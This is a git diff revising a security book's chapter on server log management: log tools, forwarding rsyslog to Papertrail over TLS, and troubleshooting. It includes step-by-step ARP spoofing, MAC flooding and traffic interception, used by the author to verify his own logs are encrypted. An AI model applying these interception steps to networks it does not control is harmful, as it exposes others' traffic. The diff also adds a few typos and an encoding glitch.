-Monitors system log files, and emails anomalies to an administrator. Once [installed](https://linuxtechme.wordpress.com/2012/01/31/install-logcheck/) it needs to be set-up to run periodically with cron, so it is not a real-time monitor, which may significantly reduce its usefulness in catching an intruder before they obtain their goal, or get a chance to modify the logs that logcheck would review. The Debian Manuals have [details](https://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s-custom-logcheck) on how to use and customise logcheck. Most of the configuration is stored in `/etc/logcheck/logcheck.conf`. You can specify which log files to review within the `/etc/logcheck/logcheck.logfiles`. Logcheck is easy to install and configure.  
+Logcheck monitors system log files, and emails anomalies to an administrator. Once [installed](https://linuxtechme.wordpress.com/2012/01/31/install-logcheck/) it needs to be set-up to run periodically with cron. It is not a real-time monitor, which may significantly reduce its usefulness in catching an intruder before they obtain their goal, or get a chance to modify the logs that logcheck would review. The Debian Manuals have [details](https://www.debian.org/doc/manuals/securing-debian-howto/ch4.en.html#s-custom-logcheck) on how to use and customise logcheck. Most of the configuration is stored in `/etc/logcheck/logcheck.conf`. You can specify which log files to review within the `/etc/logcheck/logcheck.logfiles`. Logcheck is easy to install and configure.  
   
 * [Logwatch](https://packages.debian.org/stretch/logwatch)  
-Similar to Logcheck, monitors system logs, not continuously, so they could be open to modification before Logwatch reviews them, thus rendering Logwatch infective. Logwatch targets a similar space to Simple Log Watcher and Logcheck from above, it can review all logs within a certain directory, all logs from a specified collection of services, and single log files. Logwatch creates a report of what it finds based on your level of paranoia and can email to the sys-admin. It is easy to set-up and get started though. Logwatch is available in the debian repositories and the [source](https://sourceforge.net/p/logwatch/git/ci/master/tree/) is available on SourceForge.  
+Logwatch is similar to Logcheck, it monitors system logs but not continuously, so they could be open to modification before Logwatch reviews them, thus rendering Logwatch ineffective. Logwatch targets a similar user base to Simple Log Watcher and Logcheck from above, it can review all logs within a certain directory, all logs from a specified collection of services, and single log files. Logwatch creates a report of what it finds based on your level of paranoia, and can email to the sysadmin. It is easy to set-up and get started though. Logwatch is available in the debian repositories and the [source](https://sourceforge.net/p/logwatch/git/ci/master/tree/) is available on SourceForge.  
   
 * [Logrotate](https://packages.debian.org/stretch/logrotate)  
-Use [logrotate](http://www.rackspace.com/knowledge_center/article/understanding-logrotate-utility) to make sure your logs will be around long enough to examine them. There are some usage examples  
-here: [http://www.thegeekstuff.com/2010/07/logrotate-examples/](http://www.thegeekstuff.com/2010/07/logrotate-examples/). Ships with Debian. It is just a matter of reviewing the default configuration and applying any extra config that you require specifically.  
+Use [logrotate](http://www.rackspace.com/knowledge_center/article/understanding-logrotate-utility) to make sure your logs will be around long enough to examine them. There are some usage examples here: [http://www.thegeekstuff.com/2010/07/logrotate-examples/](http://www.thegeekstuff.com/2010/07/logrotate-examples/). Logrotate ships with Debian, it's just a matter of reviewing the default configuration and applying any extra configuration that you require specifically.  
   
 * [Logstash](https://www.elastic.co/products/logstash)  
-Targets a similar problem to logrotate, but goes a lot further in that it routes and has the ability to translate between protocols. Logstash has a rich plugin ecosystem, with integrations provided by both the creators (Elastic) and the open source community. As per the above offerings, Logstash is FOSS. One of the main disadvantages I see is that Java is a dependency.  
+Logstash targets a similar problem as logrotate, but goes a lot further in that it routes, and has the ability to translate between protocols. Logstash has a rich plugin ecosystem, with integrations provided by both the creators (Elastic) and the open source community. As with the above offerings, Logstash is frea and open source FOSS. I consider Logstash's Java dependency a major disadvantage.  
   
 * [Fail2ban](http://www.fail2ban.org/wiki/index.php/Main_Page)  
-Ban hosts that cause multiple authentication errors, or just email events. Of course you need to think about false positives here also. An attacker can spoof many IP addresses potentially causing them all to be banned, thus creating a DoS. Fail2ban has been around for at least 12 years, is actively maintained and written in [Python](https://github.com/fail2ban/fail2ban/). There is also a web UI written in NodeJS called [fail2web](https://github.com/Sean-Der/fail2web).  
+Fail2ban bans hosts that cause multiple authentication errors, or just email events. You need to conscious of false positives here. An attacker can spoof many IP addresses, potentially causing them all to be banned, thus creating a DoS. Fail2ban has been around for at least 12 years, is actively maintained, and is written in [Python](https://github.com/fail2ban/fail2ban/). There is also a web UI written in NodeJS called [fail2web](https://github.com/Sean-Der/fail2web).  
   
 * [Multitail](https://packages.debian.org/stretch/multitail)  
-Does what its name says. Tails multiple log files at once and shows them in a terminal. Provides real-time multi log file monitoring. Great for seeing strange happenings before an intruder has time to modify logs, if you are watching them that is. Good for a single or small number of systems if you have spare screens to fix to the wall.  
+Multitail does exactly what its name says, it tails multiple log files at once and shows them in a terminal while providing real-time multi-log file monitoring. It's great for seeing strange happenings before an intruder has time to modify logs, assuming you are keeping watch. Multitail is good for a single system or small number of systems if you have spare screens available.  
   
-* [PaperTrail](https://papertrailapp.com/)  
-Targets a similar problem to MultiTail, except that it collects logs from as many servers as you want, and streams them off-site to PaperTrails service, then aggregates them into a single easily searchable web interface, allowing you to set-up alerts on any log text. PaperTrail has a free plan providing 100MB per month, which is enough for some purposes. The plans are reasonably cheap for the features it provides, and can scale as you grow. I have used this in production environments (as discussed soon), and have found it to be a tool that does not try to do to much, and does what it does well.
+* [Papertrail](https://papertrailapp.com/)  
+Papertrail is similar to MultiTail, except that it collects logs from as many servers as you want, and streams them offsite to the Papertrail service, then aggregates them into a single, easily searchable web interface, allowing you to set up alerts on any log text. Papertrail has a free plan providing 100MB per month, which is enough for some purposes. The plans are reasonably cheap for the features it provides, and can scale as you grow. I have used this in production environments (as discussed soon), and have found it to be a tool that does not try to do too much, and does what it does well.
 
 #### Web Server Log Management {#vps-countermeasures-lack-of-visibility-web-server-log-management}
 ![](images/ThreatTags/PreventionAVERAGE.png)
@@ -2859,54 +2852,54 @@ Targets a similar problem to MultiTail, except that it collects logs from as man
 
 **GNU syslogd**
 
-Which I am unsure of whether it is being actively developed. Most GNU/Linux distributions no longer ship with this. Only supports UDP. It is also lacking in features. From what I gather is single-threaded. I did not spend long looking at this as there was not much point. The following two offerings are the main players currently.
+I am  not it GNU syslogd remains under active development, most GNU/Linux distributions no longer ship with it. It only supports UDP and lacks features. From what I gather it's is single-threaded. I did not spend long looking at it as there was not much point in doing so. The following two offerings are the current players in the space.
 
 **Rsyslog**
 
-Which ships with Debian and most other GNU/Linux distributions now. I like to do as little as possible to achieve goals, and rsyslog fits this description for me. The [rsyslog documentation](http://www.rsyslog.com/doc/master/index.html) is good. Rainer Gerhards wrote rsyslog and his [blog](http://blog.gerhards.net/2007/08/why-does-world-need-another-syslogd.html) provides many good insights into all things system logging. Rsyslog Supports UDP, TCP, TLS. There is also the Reliable Event Logging Protocol (RELP) which Rainer created. Rsyslog is great at gathering, transporting, storing log messages and includes some really neat functionality for dividing the logs. It is not designed to alert on logs. That is where the likes of Simple Event Correlator ([SEC](http://www.gossamer-threads.com/lists/rsyslog/users/6044)) comes in, as discussed [below](#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy). Rainer Gerhards discusses why TCP is not as reliable as many [think](http://blog.gerhards.net/2008/04/on-unreliability-of-plain-tcp-syslog.html).
+Rsyslog ships with Debian and most other GNU/Linux distributions now. I like to do as little as possible to achieve goals, and rsyslog fits this description for me. The [rsyslog documentation](http://www.rsyslog.com/doc/master/index.html) is good. Rainer Gerhards wrote rsyslog and his [blog](http://blog.gerhards.net/2007/08/why-does-world-need-another-syslogd.html) provides many good insights into all things system logging. Rsyslog supports UDP, TCP, and TLS. There is also the Reliable Event Logging Protocol (RELP), which Rainer created. Rsyslog is great at gathering, transporting, storing log messages and includes some really neat functionality for dividing the logs. It is not designed to alert on logs. That is where the likes of Simple Event Correlator ([SEC](http://www.gossamer-threads.com/lists/rsyslog/users/6044)) comes in, as discussed [below](#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy). Rainer Gerhards discusses why TCP is not as reliable as many [think](http://blog.gerhards.net/2008/04/on-unreliability-of-plain-tcp-syslog.html).
 
 **Syslog-ng**
 
-I did not spend to long here, as I did not see any features that I needed that were better than the default of rsyslog. Syslog-ng can correlate log messages, both real-time and off-line, supports reliable and encrypted transport using TCP and TLS. message filtering, sorting, pre-processing, log normalisation.
+I did not spend too long here, as I did not see any features that I needed that were better than default rsyslog. Syslog-ng can correlate log messages, both real-time and offline, and supports reliable and encrypted transport using TCP and TLS. It also provides message filtering, sorting, pre-processing, log normalisation.
 
-##### Aims
+##### Goals
 
-* Record events and have them securely transferred to another syslog server in real-time, or as close to it as possible, so that potential attackers do not have time to modify them on the local system before they are replicated to another location
-* Reliability: Resilience / ability to recover connectivity. No messages lost.
-* Privacy: Log messages should not be able to be read in transit.
-* Integrity: Log messages should not be able to be tampered with / modified in transit. Integrity on the file-system is covered in other places in this chapter, such as in sections "[Partitioning on OS Installation](#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation)" and "[Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions)"
+* Record events and have them securely transferred to another syslog server in real-time, or as close to it as possible, so that potential attackers do not have time to modify them on the local system before they are replicated to another location.
+* Reliability: resilience / ability to recover connectivity. No messages lost.
+* Privacy: log messages should not be able to be read in transit.
+* Integrity: log messages should not be able to be tampered with or modified in transit. Integrity on the file-system is covered in other places in this chapter, such as in sections "[Partitioning on OS Installation](#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation)" and "[Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions)"
 * Extensibility: ability to add more machines and be able to aggregate events from many sources on [many machines](#network-countermeasures-lack-of-visibility-insufficient-logging).
-* Receive notifications from the upstream syslog server of specific events. No [Host Intrusion Detection System (HIDS)](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids) is going to remove the need to reinstall your system if you are not notified in time and an attacker plants and activates their root-kit.
-* Receive notifications from the upstream syslog server of lack of events. If you expect certain events to usually occur, but they have stopped, and you want to know about it.
+* Receive notifications from the upstream syslog server of specific events. No [Host Intrusion Detection System (HIDS)](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids) is going to negate the need to rebuild your system if you are not notified in time, and an attacker plants and activates their rootkit.
+* Receive notifications from the upstream syslog server of a lack of events. If you expect certain events to usually occur, but they have stopped, you want to know about it.
 
 ##### Environmental Considerations {#vps-countermeasures-lack-of-visibility-web-server-log-management-environmental-considerations}
 
-You may have devices in your network topology such as routers, switches, access points (APs) that do not have functionality to send their system logs via TCP, opting to rely on an unreliable transport such as UDP, often also not supporting any form of confidentiality. As this is not directly related to VPS, I will defer this portion to the [Insufficient Logging](#network-countermeasures-lack-of-visibility-insufficient-logging) countermeasures section within the Network chapter.
+You may have devices in your network topology such as routers, switches, and access points (APs) that do not have functionality to send their system logs via TCP, opting to use an unreliable transport such as UDP, without any form of confidentiality. As this is not directly related to VPS, I will defer this portion to the [Insufficient Logging](#network-countermeasures-lack-of-visibility-insufficient-logging) countermeasures section within the Network chapter.
 
-##### Initial Set-Up {#vps-countermeasures-lack-of-visibility-web-server-log-management-initial-set-up}
+##### Initial Setup {#vps-countermeasures-lack-of-visibility-web-server-log-management-initial-set-up}
 
 %% This section is also linked to from the "Insufficient Logging and Monitoring" section in web applications.
 
-Rsyslog using TCP, local queuing over TLS to papertrail for your syslog collection, aggregating and reporting server. Papertrail does not support RELP, but say that is because their clients have not seen any issues with reliability in using plain TCP over TLS with local queuing. I must have been the first then. Maybe I am the only one that actually compares what is being sent against what is being received.
+Configure rsyslog to use TCP, with local queuing over TLS to Papertrail for your syslog collection, aggregation and reporting. Papertrail does not support RELP, but likely only because users have not seen issues with reliability in TCP over TLS for local queuing. 
 
-As I was setting this up and watching both ends. We had an internet outage of just over an hour. At that stage we had very few events being generated, so it was trivial to verify both ends after the outage. I noticed that once the ISPs router was back on-line and the events from the queue moved to papertrail, that there was in fact one missing.
+As I was setting this up and watching both ends of the transaction we had an internet outage of just over an hour. At that stage we had very few events being generated, so it was trivial to verify both ends after the outage. I noticed that, once the ISP's router was back online, and the events from the queue moved to Papertrail, there was, in fact, one missing.
 
-Why did Rainer Gerhards create RELP if TCP with queues was good enough? That was a question that was playing on me for a while. In the end, it was obvious that TCP without RELP is not good enough if you want your logs to have the quality of integrity. At this stage it looks like the queues may loose messages. Rainer Gerhards [said](http://ftp.ics.uci.edu/pub/centos0/ics-custom-build/BUILD/rsyslog-3.19.8/doc/rsyslog_reliable_forwarding.html) “_In rsyslog, every action runs on its own queue and each queue can be set to buffer data if the action is not ready. Of course, you must be able to detect that the action is not ready, which means the remote server is off-line. This can be detected with plain TCP syslog and RELP_“, so it can be detected without RELP.
+Why did Rainer Gerhards create RELP if TCP with queues was good enough? That was a question on my mind for a while. In the end, it was obvious that TCP without RELP is not good enough if you want your logs to maintain integrity. Simply, it appears that queues may lose messages. Rainer Gerhards [said](http://ftp.ics.uci.edu/pub/centos0/ics-custom-build/BUILD/rsyslog-3.19.8/doc/rsyslog_reliable_forwarding.html) that in rsyslog, every action runs on its own queue, and each queue can be set to buffer data if the action is not ready. Of course, you must be able to detect that the action is not ready, which means the remote server is offline. This can be detected with TCP syslog and RELP, thus it can be detected without RELP.
 
-You can [aggregate](http://help.papertrailapp.com/kb/configuration/advanced-unix-logging-tips/#rsyslog_aggregate_log_files) log files with rsyslog or by using papertrails `remote_syslog` daemon.
+You can [aggregate](http://help.papertrailapp.com/kb/configuration/advanced-unix-logging-tips/#rsyslog_aggregate_log_files) log files with rsyslog, or by using Papertrail's `remote_syslog` daemon.
 
 Alerting is available, including for [inactivity of events](http://help.papertrailapp.com/kb/how-it-works/alerts/#inactivity).
 
-Papertrails documentation is good and support is reasonable. Due to the huge amounts of traffic they have to deal with, they are unable to trouble-shoot any issues you may have. If you still want to go down the papertrail path, to get started, work through ([https://papertrailapp.com/systems/setup](https://papertrailapp.com/systems/setup)) which sets up your rsyslog to use UDP (specified in the `/etc/rsyslog.conf` by a single ampersand in front of the target syslog server). I wanted something more reliable than that, so I use two ampersands, which specifies TCP.
+Papertrail's documentation is good and support is reasonable. Due to the huge amounts of traffic they have to deal with, they are unable to troubleshoot any issues you may have. If you still want to go down the Papertrail path, to get started, work through ([https://papertrailapp.com/systems/setup](https://papertrailapp.com/systems/setup)) which sets up your rsyslog to use UDP (specified in the `/etc/rsyslog.conf` by a single ampersand in front of the target syslog server). I wanted something more reliable than that, so I use two ampersands, which specifies TCP.
 
-As we are going to be sending our logs over the internet for now, we need TLS, check papertrails "[Encrypting with TLS](http://help.papertrailapp.com/kb/configuration/encrypting-remote-syslog-with-tls-ssl/#rsyslog)" docs. Check papertrails CA server bundle for integrity:
+As we are sending logs over the Internet and need TLS, check Papertrail "[Encrypting with TLS](http://help.papertrailapp.com/kb/configuration/encrypting-remote-syslog-with-tls-ssl/#rsyslog)" docs. Check Papertrail's CA server bundle for integrity:
 
 {linenos=off, lang=bash}
     curl https://papertrailapp.com/tools/papertrail-bundle.pem | md5sum
 
-Should result in what ever it says on papertrails "Encrypting with TLS" page. First problem here: the above mentioned page that lists the MD5 checksum is being served unencrypted, even if you force the use of `https` I get an invalid certificate error. My advice would be to contact papertrail directly and ask them what the MD5 checksum should be. Make sure it is the same as what the above command produces.
+This should match with Papertrail"s "Encrypting with TLS" page. First problem here: the above mentioned page that lists the MD5 checksum is being served unencrypted, even if you force the use of `https` the result is an invalid certificate error. My advice would be to contact Papertrail directly and ask them what the MD5 checksum should be. Make sure it is the same as what the above command produces.
 
-If it is, put the contents of that URL into a file called `papertrail-bundle.pem`, then [`scp`](https://blog.binarymist.net/2012/03/25/copying-with-scp/) the `papertrail-bundle.pem` into the web servers `/etc` dir. The command for that will depend on whether you are already on the web server and you want to pull, or whether you are somewhere else and want to push. Then make sure the ownership is correct on the pem file.
+If it is, put the contents of that URL into a file called `papertrail-bundle.pem`, then [`scp`](https://blog.binarymist.net/2012/03/25/copying-with-scp/) the `papertrail-bundle.pem` to the web server's `/etc` directory. The command will depend on whether you are already on the web server and you want to pull, or whether you are somewhere else and want to push. Make sure the ownership is correct on the pem file.
 
 {linenos=off, lang=bash}
     chown root:root papertrail-bundle.pem
@@ -2925,7 +2918,7 @@ Add the TLS config:
     $ActionSendStreamDriverAuthMode x509/name # authenticate by host-name
     $ActionSendStreamDriverPermittedPeer *.papertrailapp.com
 
-to your `/etc/rsyslog.conf`. Create egress rule for your router to let traffic out to destination port `39871`.
+to your `/etc/rsyslog.conf`. Create an egress rule for your router to let traffic out to destination port `39871`.
 
 {linenos=off, lang=bash}
     sudo service rsyslog restart
@@ -2935,17 +2928,17 @@ To generate a log message that uses your system syslogd config `/etc/rsyslog.con
 {linenos=off, lang=bash}
     logger "hi"
 
-Should log “`hi`” to `/var/log/messages` and also to [https://papertrailapp.com/events](https://papertrailapp.com/events), but it was not.
+This should have logged `hi` to `/var/log/messages` and to [https://papertrailapp.com/events](https://papertrailapp.com/events), but it did not.
 
-**Time to Trouble-shoot**
+**Time to Troubleshoot**
 
-Let us keep an eye on `/var/log/messages`, where our log messages should be written to for starters. In one terminal run the following:
+Keep an eye on `/var/log/messages`, where our log messages should be written to for starters. In one terminal run the following:
 
 {linenos=off, lang=bash}
     # Show a live update of the last 10 lines (by default) of /var/log/messages
     sudo tail -f [-n <number of lines to tail>] /var/log/messages
 
-OK, so lets run rsyslog in config checking mode:
+Let's run rsyslog in config checking mode:
 
 {linenos=off, lang=bash}
     /usr/sbin/rsyslogd -f /etc/rsyslog.conf -N1
@@ -2956,14 +2949,14 @@ If the config is OK, the output will look like:
     rsyslogd: version <the version number>, config validation run (level 1), master config /etc/rsyslog.conf
     rsyslogd: End of config validation run. Bye.
 
-Some of the trouble-shooting resources I found were:
+Some of the troubleshooting resources I found were:
 
 1. [https://www.loggly.com/docs/troubleshooting-rsyslog/](https://www.loggly.com/docs/troubleshooting-rsyslog/)
 2. [http://help.papertrailapp.com/](http://help.papertrailapp.com/)
 3. [http://help.papertrailapp.com/kb/configuration/troubleshooting-remote-syslog-reachability/](http://help.papertrailapp.com/kb/configuration/troubleshooting-remote-syslog-reachability/)
 4. `/usr/sbin/rsyslogd -version` will provide the installed version and supported features.
 
-The papertrail help was not that helpful, as we do not, and should not have telnet installed, we removed it [remember](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-telnet)? I can not ping from the DMZ as ICMP egress is not white-listed and I am not going to install tcpdump or strace on a production server. The more you have running, the more surface area you have, the greater the opportunities for exploitation, good for attackers, bad for defenders.
+The Papertrail help was not that helpful, as we do not, and should not have Telnet installed, we removed it, [remember](#vps-countermeasures-disable-remove-services-harden-what-is-left-remove-telnet)? I cannot ping from the DMZ as ICMP egress is not whitelisted and I am not going to install tcpdump or strace on a production server. The more you have running, the more surface area you have, the greater the opportunities for exploitation; good for attackers, bad for defenders.
 
 So how do we tell if rsyslogd is actually running if it does not appear to be doing anything useful?
 
@@ -2979,27 +2972,27 @@ Showing which files rsyslogd has open can be useful:
     # or just combine the results of pidof rsyslogd:
     sudo lsof -p $(pidof rsyslogd)
 
-To start with, produced output like:
+To start with, this produced output such as:
 
 {linenos=off, lang=bash}
     rsyslogd 3426 root 8u IPv4 9636 0t0 TCP <your server IP>:<sending port>->logs2.papertrailapp.com:39871 (SYN_SENT)
 
-Which obviously showed rsyslogds `SYN` packets were not getting through. I had some discussion with Troy from papertrail support around the reliability of plain TCP over TLS without RELP. I think if the server is business critical, then [Improving the Strategy](#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy) maybe required. Troy assured me that they had never had any issues with logs being lost due to lack of reliability with out RELP. Troy also pointed me to their recommended [local queue options](http://help.papertrailapp.com/kb/configuration/advanced-unix-logging-tips/#rsyslog_queue). After adding the queue tweaks and a rsyslogd restart, the above command now produced output like:
+This obviously showed rsyslogds `SYN` packets were not getting through. I had some discussion with Troy from Papertrail support about the reliability of TCP over TLS without RELP. I think if the server is business critical, then [Improving the Strategy](#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy) maybe required. Troy assured me that they had never had any issues with logs being lost due to the absence of RELP. Troy also pointed me to their recommended [local queue options](http://help.papertrailapp.com/kb/configuration/advanced-unix-logging-tips/#rsyslog_queue). After adding the queue tweaks and a rsyslogd restart, the above command now produced output such:
 
 {linenos=off, lang=bash}
     rsyslogd 3615 root 8u IPv4 9766 0t0 TCP <your server IP>:<sending port>->logs2.papertrailapp.com:39871 (ESTABLISHED)
 
-I could now see events in the papertrail web UI in real-time.
+I could now see events in the Papertrail web UI in real-time.
 
 Socket Statistics (`ss`) (the better `netstat`) should also show the established connection.
 
-By default papertrail accepts TCP over TLS (TLS encryption check-box on, Plain text check-box off) and UDP. So if your TLS is not set-up properly, your events will not be accepted by papertrail. This is how I confirmed this to be true:
+By default, Papertrail accepts TCP over TLS (TLS encryption checkbox on, plain text checkbox off) and UDP. If your TLS is not set up properly, your events will not be accepted by Papertrail. Following is how I confirmed this to be true:
 
 **Confirm that our Logs are Commuting over TLS**
 
-Now without installing anything on the web server or router, or physically touching the server sending packets to papertrail, or the router. Using a switch (ubiquitous) rather than a hub. No wire tap or multi-network interfaced computer. No switch monitoring port available on expensive enterprise grade switches (along with the much needed access). I was basically down to two approaches I could think of, and I like to achieve as much as possible with as little amount of effort as possible, so could not be bothered getting out of my chair and walking to the server rack.
+We can do this without installing anything on the web server or router, or physically touching the server sending packets to Papertrail, or the router. Use a switch (ubiquitous) rather than a hub, and no tap or multi-network interfaced computer. Commonly there is no switch monitoring port available on expensive enterprise grade switches (along with the much needed access). I was down to two approaches here that I could think of, and I like to achieve as much as possible with the least amount of work, as such I could not be bothered getting out of my chair and walking to the server rack.
 
-1. MAC flooding with the help of [macof](http://linux.die.net/man/8/macof) which is a utility from the dsniff suite. This essentially causes your switch to go into a “failopen mode” where it acts like a hub and broadcasts its packets to every port.  
+1. MAC flooding with the help of [macof](http://linux.die.net/man/8/macof), which is a utility from the dsniff suite. This essentially causes your switch to go into a fail open mode where it acts like a hub and broadcasts its packets to every port.  
     
     ![](images/MItMMACFlod.png)  
     
@@ -3007,13 +3000,13 @@ Now without installing anything on the web server or router, or physically touch
     
     ![](images/MItMARPSpoof.png)
 
-On our MItM box, I set a static `IP`: `address`, `netmask`, `gateway` in `/etc/network/interfaces` and add `domain`, `search` and `nameservers` to the `/etc/resolv.conf`.
+On our MItM box, I set a static `IP`: `address`, `netmask`, `gateway` in `/etc/network/interfaces` and added `domain`, `search` and `nameservers` to the `/etc/resolv.conf`.
 
 Follow that up with a `service network-manager restart`.
 
 On the web server, run: `ifconfig -a` to get MAC: `<your server MAC>`.
 
-On MItM box, run the same command, to get MAC: `<MItM box MAC>`.
+On the MItM box, run the same command, to get MAC: `<MItM box MAC>`.
 
 On web server, run: `ip neighbour` to find MAC addresses associated with IP addresses (the local ARP table). Router will be: `<router MAC>`.
 
@@ -3027,7 +3020,7 @@ Now you need to turn your MItM box into a router temporarily. On the MItM box ru
 {linenos=off, lang=bash}
     cat /proc/sys/net/ipv4/ip_forward
 
-If forwarding is on, You will see a `1`. If it is not, add a `1` into the file:
+If forwarding is on, you will see a `1`. If it is not, add a `1` into the file:
 
 {linenos=off, lang=bash}
     echo 1 > /proc/sys/net/ipv4/ip_forward
@@ -3044,38 +3037,38 @@ This will continue to notify `<your server IP>` that our MItM box MAC address be
     <MItM box IP> dev eth0 lladdr <MItM box MAC> STALE
     <router IP> dev eth0 lladdr <MItM box MAC> REACHABLE
 
-Now on our MItM box, while our `arpspoof` continues to run, we [start Wireshark](https://blog.binarymist.net/2013/04/13/running-wireshark-as-non-root-user/) listening on our `eth0` interface or what ever interface you are bound to, and you can see that all packets that the web server is sending, we are intercepting and forwarding (routing) on to the gateway.
+Now on our MItM box, while our `arpspoof` continues to run, we [start Wireshark](https://blog.binarymist.net/2013/04/13/running-wireshark-as-non-root-user/) listening on our `eth0` interface or what ever interface you are bound to. You can see that all packets that the web server is sending, we are intercepting and forwarding (routing) on to the gateway.
 
-Now Wireshark clearly showed that the data was encrypted. I commented out the five TLS config lines in the `/etc/rsyslog.conf` file -> saved -> restarted rsyslog -> turned on “Plain text” in papertrail and could now see the messages in clear text. Now when I turned off “Plain text”, papertrail would no longer accept syslog events. Excellent!
+Wireshark clearly showed that the data was encrypted. I commented out the five TLS config lines in the `/etc/rsyslog.conf` file then saved and restarted rsyslog. I turned on plain text in Papertrail and could now see the messages in clear text. When I turned off plain text, Papertrail would no longer accept syslog events. Excellent!
 
 One of the nice things about `arpspoof` is that it re-applies the original ARP mappings once it is done.
 
-You can also tell `arpspoof` to poison the routers ARP table. This way any traffic going to the web server via the router, not originating from the web server will be routed through our MItM box also.
+You can also tell `arpspoof` to poison the router's ARP table. This way any traffic going to the web server via the router, not originating from the web server, will be routed through our MItM box.
 
 Do not forget to revert the change to `/proc/sys/net/ipv4/ip_forward`.
 
 **Exporting Wireshark Capture**
 
-You can use the File->Save As… option here for a collection of output types, or the way I usually do it is:
+You can use the File->Save option here for a collection of output types. The way I usually do it is:
 
-1. First completely expand all the frames you want visible in your capture file
-2. File -> Export Packet Dissections -> as “Plain Text” file
-3. Check the “All packets” check-box
-4. Check the “Packet summary line” check-box
-5. Check the “Packet details:” check-box and the “As displayed”
+1. First completely expand all the frames you want visible in your capture file 
+2. File -> Export Packet Dissections -> as a plain text file 
+3. Check the All Packets checkbox
+4. Check the Packet summary line checkbox 
+5. Check the Packet details check-box and the As displayed checkbox 
 6. OK
 
-**Trouble-shooting Messages that papertrail Never Shows**
+**Trouble-shooting Messages that Papertrail Never Shows**
 
 A> To run rsyslogd in [debug](http://www.rsyslog.com/doc/v5-stable/troubleshooting/troubleshoot.html#debug-log)
 
-Check to see which arguments get passed into rsyslogd to run as a daemon in `/etc/init.d/rsyslog` and `/etc/default/rsyslog`. You will probably see a `RSYSLOGD_OPTIONS=""`. There may be some arguments between the quotes.
+Check to see which arguments get passed into rsyslogd to run as a daemon in `/etc/init.d/rsyslog` and `/etc/default/rsyslog`. You will probably see `RSYSLOGD_OPTIONS=""`. There may be some arguments between the quotes.
 
 {linenos=off, lang=bash}
     sudo service rsyslog stop
     sudo /usr/sbin/rsyslogd [your options here] -dn >> ~/rsyslog-debug.log
 
-The debug log can be quite useful for trouble-shooting. Also keep your eye on the stderr as you can see if it is writing anything out (most system start-up scripts throw this away). Once you have finished collecting log: [CTRL]+[C]
+The debug log can be quite useful for troubleshooting. Also keep your eye on the stderr as you can see if it is writing anything out (most system startup scripts throw this away). Once you have finished collecting the log: [CTRL]+[C]
 
 {linenos=off, lang=bash}
     sudo service rsyslog start
@@ -3102,12 +3095,12 @@ The stats it produces show when you run into errors with an output, and also the
     log.file="/var/log/rsyslog-stats.log")
     # End turn on some internal counters to trouble-shoot missing messages
 
-Now if you get an error like:
+Now, if you get an error such as
 
 {linenos=off, lang=bash}
     rsyslogd-2039: Could not open output pipe '/dev/xconsole': No such file or directory [try http://www.rsyslog.com/e/2039 ]
 
-You can just change the `/dev/xconsole` to `/dev/console`. Xconsole is still in the config file for legacy reasons, it has not been cleaned up by the package maintainers.
+you can just change the `/dev/xconsole` to `/dev/console`. Xconsole is still in the config file for legacy reasons, it has not been cleaned up by the package maintainers.
 
 A> GnuTLS error in rsyslog-debug.log
 
@@ -3123,7 +3116,7 @@ Standard Error when running rsyslogd manually produces:
 
 With some help from the GnuTLS mailing list:
 
-“_That means that send() returned -1 for some reason._” You can enable more output by adding an environment variable `GNUTLS_DEBUG_LEVEL=9` prior to running the application, and that should at least provide you with the `errno`. This does not provide any more detail to stderr. However, [thanks to Rainer](https://github.com/rsyslog/rsyslog/issues/219) we do now have [debug.gnutls parameter](https://github.com/jgerhards/rsyslog/commit/9125ddf99d0e5b1ea3a15a730fc409dd27df3fd9) in the rsyslog code, that if you specify this global variable in the `rsyslog.conf` and assign it a value between 0-10 you will have gnutls debug output going to rsyslog’s debug log.
+That means that send() returned -1 for some reason. You can enable more output by adding an environment variable `GNUTLS_DEBUG_LEVEL=9` prior to running the application, and that should at least provide you with the `errno`. This does not provide any more detail to stderr. However, [thanks to Rainer](https://github.com/rsyslog/rsyslog/issues/219) we do now have the [debug.gnutls parameter](https://github.com/jgerhards/rsyslog/commit/9125ddf99d0e5b1ea3a15a730fc409dd27df3fd9) in the rsyslog code. If you specify this global variable in the `rsyslog.conf` and assign it a value between 0-10 you will have gnutls debug output going to rsyslog's debug log.
 
 ##### Improving the Strategy {#vps-countermeasures-lack-of-visibility-web-server-log-management-improving-the-strategy}
 
@@ -3230,7 +3223,7 @@ Requires NPM to [install globally](https://www.npmjs.com/package/forever). We al
 3. forever provides no file integrity or times-tamp checking, so there is nothing stopping your application files being swapped for trojanised counterfeits with forever
 4. Ability to add the following later without having to swap the chosen offering:
     1. Reverse proxy: I do not see a problem
-    2. Integrate NodeJS’s core module [cluster](https://nodejs.org/api/cluster.html) into your NodeJS application for load balancing
+    2. Integrate NodeJSâ€™s core module [cluster](https://nodejs.org/api/cluster.html) into your NodeJS application for load balancing
     3. Visibility of application statistics could be added later with the likes of [Monit](#vps-countermeasures-lack-of-visibility-proactive-monitoring-monit) or something else, but if you used Monit, then there would not really be a need for forever, as Monit does the little that forever does and is capable of so much more, but is not pushy on what to do and how to do it. All the behaviour is defined with quite a nice syntax in a config file or as many as you like.
 5. There is enough documentation to feel comfortable consuming forever, as forever does not do a lot, which is not a bad trait to have
 6. The code it self is probably production ready, but I have heard quite a bit about stability issues. You are also expected to have NPM installed (more attack surface in the form of an application whos sole purpose is to install more packages, which goes directly against what we are trying to achieve by minimising the attack surface) when we already have native package managers on the server(s).
@@ -3247,9 +3240,9 @@ I prefer the dark cockpit approach from my monitoring tools. What I mean by that
 
